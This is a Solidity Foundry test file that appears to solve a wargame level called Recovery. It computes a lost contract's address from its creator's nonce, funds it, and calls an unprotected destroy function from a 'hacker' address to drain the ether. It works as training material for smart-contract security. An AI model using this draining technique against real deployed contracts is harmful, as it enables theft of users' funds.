// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/17_Recovery.sol";



contract RecoveryTest is Test {
    Recovery public rc;
    address public hacker = address(0x1337);
    SimpleToken public st;

    function setUp() public {
        rc = new Recovery();
       


        vm.deal(hacker, 1 ether);
    }

    function testExploit() public { 
        rc.generateToken("LostToken", 1000);

        // Calculate the address of the lost contract using cheatcodes
        address creador = address(rc);
        uint256 nonce = 1;
        address contratoPerdido = vm.computeCreateAddress(creador, nonce);
        
        // Add founds to the lost contract
        vm.deal(contratoPerdido, 1 ether);
        assertEq(address(SimpleToken(payable(contratoPerdido))).balance, 1 ether);
        
        // Drain the ether from the lost contract
        vm.startPrank(hacker);
        SimpleToken(payable(contratoPerdido)).destroy(payable(hacker));
        assertEq(address(SimpleToken(payable(contratoPerdido))).balance, 0);
        vm.stopPrank();

    }
}